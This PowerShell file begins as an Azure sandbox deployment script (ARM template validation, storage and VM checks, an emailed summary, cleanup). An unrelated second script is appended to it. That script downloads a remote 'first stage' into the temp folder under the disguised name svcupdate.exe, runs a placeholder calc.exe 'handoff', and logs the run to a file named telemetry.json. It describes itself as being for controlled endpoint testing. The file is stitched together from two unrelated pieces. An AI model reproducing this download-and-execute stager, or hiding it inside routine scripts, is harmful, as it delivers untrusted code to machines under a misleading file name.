
<#
.SYNOPSIS
    Deploys a sandbox resource group from an ARM template and validates the result.
.DESCRIPTION
    Runs a template validation first, then creates the resource group, the
    storage account and the test virtual machine before cleaning the sandbox up.
    The cleanup step honours the DryRun switch so the resources can be inspected
    after a failed deployment.
.EXAMPLE
    .\Deploy-PortalTest.ps1 -ResourceGroup rg-portal-test-33
#>

param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$ResourceGroup = "rg-portal-test-33",
    [ValidateSet("westeurope", "eastus", "northeurope", "uksouth")]
    [string]$Location = 'eastus',
    [string]$TemplateFile = 'C:\Scripts\templates\portal-test.json',
    [string]$ParameterFile = 'C:\Scripts\templates\portal-test.parameters.json',

    [string]$SubscriptionId = 'f7343cc9-6822-fb9c-859f-1361fd1b78c1',
    [string]$StorageAccount = 'sttest7343',
    [string]$VmName = "vm-portal-test-33",
    [string]$OutputPath = 'C:\Logs\deploy-test-2025-11-23.json',

    [switch]$DryRun
)
$WarningPreference = 'Continue'
$scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path

if (-not (Get-Module -ListAvailable -Name Az.Resources)) {
    throw 'The Az.Resources module is not installed.'
}
Import-Module Az.Resources -ErrorAction Stop

$context = Get-AzContext
if (-not $context) {
    Connect-AzAccount -Tenant 'contoso.com' -Subscription $SubscriptionId
}

$DeploymentName = "portal-" + (Get-Date -Format 'yyyyMMdd-HHmm')

if (-not (Get-AzResourceGroup -Name $ResourceGroup -ErrorAction SilentlyContinue)) {
    New-AzResourceGroup -Name $ResourceGroup -Location $Location | Out-Null
    Write-Verbose ("Created resource group {0}" -f $ResourceGroup)
}

$validation = Test-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile
if ($validation) {
    $validation | Format-Table -AutoSize
    throw 'Template validation failed.'
}

$deployment = New-AzResourceGroupDeployment `
    -ResourceGroupName $ResourceGroup `
    -TemplateFile $TemplateFile `
    -TemplateParameterFile $ParameterFile `
    -Name $DeploymentName `
    -Verbose

$profile = Get-AzResourceGroupDeployment -ResourceGroupName $ResourceGroup -ErrorAction SilentlyContinue |
    Sort-Object -Property Timestamp -Descending | Select-Object -First 3
$profile | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-Table -AutoSize

$storage = New-AzStorageAccount -ResourceGroupName $ResourceGroup `
    -Name $StorageAccount -Location $Location `
    -SkuName Standard_LRS -Kind StorageV2 -ErrorAction Stop
Write-Verbose ("Storage account {0} provisioned" -f $storage.StorageAccountName)
$vm = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -ErrorAction SilentlyContinue
if ($vm) {
    $status = Get-AzVM -ResourceGroupName $ResourceGroup -Name $VmName -Status
    $status.Statuses | Select-Object Code, DisplayStatus | Format-Table -AutoSize
}
else {
    Write-Warning ("Virtual machine {0} was not created" -f $VmName)
}

$deployment | Select-Object DeploymentName, ProvisioningState, Timestamp | Format-List
$deployment.Outputs | Format-Table -AutoSize

$summary = [pscustomobject]@{
    ResourceGroup     = $ResourceGroup
    Location          = $Location
    DeploymentName    = $DeploymentName
    ProvisioningState = $deployment.ProvisioningState
    StorageAccount    = $StorageAccount
    CompletedAt       = (Get-Date).ToString('yyyy-MM-dd HH:mm:ss')
}
$summary | ConvertTo-Json -Depth 3 | Set-Content -Path $OutputPath -Encoding UTF8

$style = @'
<style>
body { font-family: Tahoma; font-size: 12px; }
table { border-collapse: collapse; width: 100%; }
th { background: #e8eef7; text-align: left; padding: 4px; }
td { border-bottom: 1px solid #dddddd; padding: 4px; }
</style>
'@

@($summary) | ConvertTo-Html -Title 'Deployment summary' -Head $style |
    Set-Content -Path $OutputPath.Replace('.json', '.html') -Encoding UTF8

$MailTo = 'cloudops@internal.corp'
$subject = "Sandbox deployment {0}" -f $deployment.ProvisioningState
$mailParams = @{
    To         = $MailTo
    From       = "cloudops@internal.corp"
    Subject    = $subject
    Body       = "See the deployment summary attached to the run log."
    SmtpServer = "smtp.internal.corp"
    Port       = 25
    UseSsl     = $true
}
Send-MailMessage @mailParams

if (-not $DryRun) {
    Remove-AzResourceGroup -Name $ResourceGroup -Force | Out-Null
    Write-Host ("Removed sandbox resource group {0}" -f $ResourceGroup)
}
Write-Host ("Sandbox deployment finished: {0}" -f $deployment.ProvisioningState) -ForegroundColor Green

$pricing = Get-AzConsumptionPriceSheet -ErrorAction SilentlyContinue
Write-Verbose ("Price sheet entries: {0}" -f @($pricing).Count)

$providers = Get-AzResourceProvider -ProviderNamespace Microsoft.Compute -ErrorAction SilentlyContinue
if ($providers) {
    Write-Verbose ("Provider registered: {0}" -f $providers.RegistrationState)
}

$tags = @{
    Environment = 'test'
    Owner       = 'platform-team'
    CostCenter  = 'CC-1042'
}
Write-Verbose ("Tags: {0}" -f ($tags.Keys -join ', '))

$quotas = Get-AzVMUsage -Location $Location -ErrorAction SilentlyContinue |
    Where-Object { $_.CurrentValue -ge ($_.Limit * 0.8) }
$quotas | Select-Object -First 5 Name, CurrentValue, Limit | Format-Table -AutoSize

$deployLog = Join-Path $env:TEMP ("az-deploy-" + (Get-Date -Format 'yyyyMMdd-HHmmss') + ".log")
Write-Verbose ("Deployment log: {0}" -f $deployLog)

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())
<#
.SYNOPSIS
    Multi-stage download and handoff workflow.

.DESCRIPTION
    Downloads a first-stage script, verifies the drop path, then
    invokes a second-stage helper that performs the handoff.
    Both stages share the same bounded timeout and retry policy.

.NOTES
    Intended for controlled endpoint testing.

.EXAMPLE
    PS> .\updater.ps1
#>
[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://contoso.com/stage1.ps1',
    [string]$PayloadPath = "$env:TEMP\svcupdate.exe",
    [string]$StageLog = "$env:TEMP\telemetry.json",
    [int]$TransferTimeout = 159
)
$ErrorActionPreference = "Stop"
$ProgressPreference = "SilentlyContinue"

# First stage
function Invoke-Stage1Download {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = '',
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 159
    )

    Write-Verbose ("Downloading first stage from " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    if (-not (Test-Path -Path $DestinationPath)) {
        throw "First stage was not written to disk"
    }
    return $DownloadedPath = $DestinationPath
}

# Second stage
function Invoke-Stage2Execution {
    [CmdletBinding()]
    param(
        [string]$StagedPath = '',
        [int]$DelaySeconds = 2
    )

    Write-Verbose ("Preparing handoff for " + $StagedPath)
    Start-Sleep -Seconds $DelaySeconds
    Start-Process -FilePath "calc.exe"
    Write-Verbose "Second stage handoff complete"
    return $true
}

try {
    Write-Verbose "Starting multi-stage workflow"
    $StageResult = Invoke-Stage1Download -SourceUrl $DownloadUrl -DestinationPath $PayloadPath -TimeoutSec $TransferTimeout
    if ($StageResult) {
        $HandoffResult = Invoke-Stage2Execution -StagedPath $PayloadPath
        Write-Verbose ("Handoff result: " + $HandoffResult)
    }
    else {
        Write-Warning "First stage did not complete"
    }
}
catch {
    Write-Warning "Multi-stage workflow failed: $($_.Exception.Message)"
}

$StageSummary = [ordered]@{
    Stage1 = "download"
    Stage2 = "handoff"
    Endpoint = $DownloadUrl
    Destination = $PayloadPath
    TimeoutSec = $TransferTimeout
}
$StageSummary | ConvertTo-Json -Depth 3 | Out-File -FilePath $StageLog -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Retry budget remaining"
Write-Verbose "Checking local path"
Write-Verbose "Operation completed"
Write-Verbose "Resolving configured target"
Write-Verbose "Stage handoff finished"
Write-Verbose "Inspecting process list"
Write-Verbose "Starting workflow"
Write-Verbose "Validating result"
Set-Location -Path $env:TEMP
